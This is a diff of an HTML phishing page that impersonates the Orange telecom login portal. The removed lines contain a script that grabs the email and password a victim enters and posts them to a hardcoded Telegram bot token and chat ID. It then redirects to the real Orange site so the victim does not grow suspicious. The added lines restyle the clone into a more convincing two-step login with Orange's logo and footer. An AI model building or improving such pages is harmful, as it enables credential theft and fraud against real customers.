@@ -3,140 +3,223 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connexion - Portail Orange</title>
+    <title>Identification - Orange</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f6f6f6;
+        /* RESET & BASE */
+        * {
+            box-sizing: border-box;
             margin: 0;
+            padding: 0;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        body {
+            background-color: #fff;
             display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
+            flex-direction: column;
+            min-height: 100vh;
         }
 
-        .login-container {
-            background-color: white;
-            padding: 40px;
+        /* CONTAINER PRINCIPAL */
+        .main-wrapper {
+            flex: 1;
+            display: flex;
+            justify-content: center; /* Centre horizontalement sur PC */
+            padding: 20px;
+        }
+
+        .login-box {
             width: 100%;
-            max-width: 400px;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
-            text-align: left;
+            max-width: 400px; /* Taille fixe sur PC, s'adapte sur Mobile */
+            margin-top: 40px;
         }
 
-        /* Logo Réel */
+        /* LOGO ORANGE OFFICIEL */
+        .logo-container {
+            text-align: center;
+            margin-bottom: 40px;
+        }
         .logo-orange {
-            width: 50px;
+            width: 50px; /* Taille identique à ta capture */
             height: 50px;
-            margin-bottom: 25px;
-            display: block;
+            /* Si tu as le fichier localement, remplace l'URL ci-dessous par ton chemin d'accès */
+            background-image: url('https://upload.wikimedia.org/wikipedia/commons/c/c8/Orange_logo.svg');
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+            display: inline-block;
         }
 
+        /* TYPOGRAPHIE */
         h1 {
-            font-size: 24px;
+            font-size: 32px;
+            font-weight: bold;
+            margin-bottom: 40px;
+            text-align: center;
+        }
+
+        h2 {
+            font-size: 20px;
             font-weight: bold;
             margin-bottom: 30px;
-            color: #000;
+            text-align: left; /* Aligné à gauche comme sur ton screen */
         }
 
+        /* CHAMPS DE SAISIE */
         .input-group {
-            margin-bottom: 20px;
-        }
-
-        label {
-            display: block;
-            margin-bottom: 8px;
-            font-size: 14px;
-            color: #666;
+            position: relative;
+            margin-bottom: 40px;
+            border-bottom: 1px solid #000; /* Juste une ligne du bas */
         }
 
         input {
             width: 100%;
-            padding: 15px;
-            border: 1px solid #ccc;
-            box-sizing: border-box;
-            font-size: 16px;
-        }
-
-        input:focus {
-            outline: 2px solid #ff7900;
-            border-color: transparent;
-        }
-
-        .btn-submit {
-            background-color: #ff7900; /* Orange plus vif pour le bouton */
-            color: white;
             border: none;
-            padding: 15px;
-            width: 100%;
+            padding: 10px 0;
             font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 10px;
+            outline: none;
+            background: transparent;
         }
 
-        .btn-submit:hover {
-            background-color: #e66d00;
+        /* BOUTON NOIR */
+        .btn-continue {
+            width: 100%;
+            background-color: #000;
+            color: #fff;
+            padding: 18px;
+            font-size: 18px;
+            font-weight: bold;
+            border: none;
+            cursor: pointer;
+            transition: 0.2s;
         }
+
+        .btn-continue:hover {
+            background-color: #333;
+        }
+
+        /* NAVIGATION RETOUR */
+        .back-link {
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+            margin-bottom: 20px;
+            font-weight: bold;
+            text-align: left;
+        }
+        .back-link span {
+            margin-right: 10px;
+            font-size: 20px;
+        }
+
+        /* FOOTER NOIR (Adaptatif) */
+        footer {
+            background-color: #000;
+            color: #fff;
+            padding: 40px 20px;
+            margin-top: 50px;
+        }
+
+        .footer-content {
+            max-width: 1000px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: repeat(2, 1fr); /* 2 colonnes sur mobile */
+            gap: 20px;
+        }
+
+        @media (min-width: 768px) {
+            .footer-content {
+                grid-template-columns: repeat(4, 1fr); /* 4 colonnes sur ordi */
+            }
+        }
+
+        .footer-content div {
+            font-size: 13px;
+            cursor: pointer;
+        }
+
+        .footer-content div:hover {
+            text-decoration: underline;
+        }
+
+        .copyright {
+            max-width: 1000px;
+            margin: 30px auto 0;
+            color: #999;
+            font-size: 12px;
+            text-align: left;
+        }
+
+        /* MASQUAGE ÉTAPES */
+        .hidden { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="login-container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/c/c8/Orange_logo.svg" alt="Orange" class="logo-orange">
-        
-        <h1>Identifiez-vous</h1>
-        
-        <form id="loginForm">
-            <div class="input-group">
-                <label for="email">Adresse mail ou n° de mobile</label>
-                <input type="text" id="email" required>
+    <div class="main-wrapper">
+        <div class="login-box">
+            
+            <div class="logo-container">
+                <div class="logo-orange"></div>
             </div>
 
-            <div class="input-group">
-                <label for="password">Mot de passe</label>
-                <input type="password" id="password" required>
+            <div id="step-1">
+                <h1>Identifiez-vous</h1>
+                <h2>Indiquez votre compte Orange</h2>
+                
+                <div class="input-group">
+                    <input type="text" id="email" placeholder="Adresse e-mail ou n° de mobile Orange">
+                </div>
+
+                <button class="btn-continue" onclick="toStep2()">Continuer</button>
             </div>
 
-            <button type="submit" class="btn-submit">Suivant</button>
-        </form>
+            <div id="step-2" class="hidden">
+                <div class="back-link" onclick="toStep1()">
+                    <span>←</span> <small id="user-val"></small>
+                </div>
+                <h1>Saisissez votre mot de passe</h1>
+                
+                <div class="input-group">
+                    <input type="password" id="pass" placeholder="Mot de passe">
+                </div>
+
+                <button class="btn-continue">Se connecter</button>
+            </div>
+
+        </div>
     </div>
 
+    <footer>
+        <div class="footer-content">
+            <div>Informations légales</div>
+            <div>Gestion cookies</div>
+            <div>Plan de site</div>
+            <div>Livraisons</div>
+            <div>Données personnelles</div>
+            <div>Retours</div>
+            <div>Accessibilité</div>
+            <div>Publicité</div>
+        </div>
+        <p class="copyright">© Orange 2026</p>
+    </footer>
+
     <script>
-    document.getElementById('loginForm').addEventListener('submit', function(e) {
-        e.preventDefault();
+        function toStep2() {
+            const val = document.getElementById('email').value;
+            if(val.trim() !== "") {
+                document.getElementById('user-val').innerText = val;
+                document.getElementById('step-1').classList.add('hidden');
+                document.getElementById('step-2').classList.remove('hidden');
+            }
+        }
 
-        // Récupération des données du formulaire
-        const email = document.getElementById('email').value;
-        const password = document.getElementById('password').value;
-
-        // --- TES PARAMÈTRES ICI ---
-        const botToken = "8026121554:AAFhlKS20DrJtKdoLh68Ju91_VcDs87ABBE";
-        const chatId = "8252190794";
-        // ---------------------------
-
-        const message = `🔔 NOUVEAU LOG ORANGE\n\n📧 Mail: ${email}\n🔑 Pass: ${password}`;
-
-        // Envoi vers l'API Telegram
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: chatId,
-                text: message
-            })
-        })
-        .then(() => {
-            // Une fois envoyé, on redirige l'utilisateur vers le vrai site
-            window.location.href = "https://login.orange.fr";
-        })
-        .catch((error) => {
-            console.error('Erreur:', error);
-            // Redirection quand même pour ne pas éveiller de soupçons
-            window.location.href = "https://login.orange.fr";
-        });
-    });
-</script>
+        function toStep1() {
+            document.getElementById('step-2').classList.add('hidden');
+            document.getElementById('step-1').classList.remove('hidden');
+        }
+    </script>
 
 </body>
 </html>
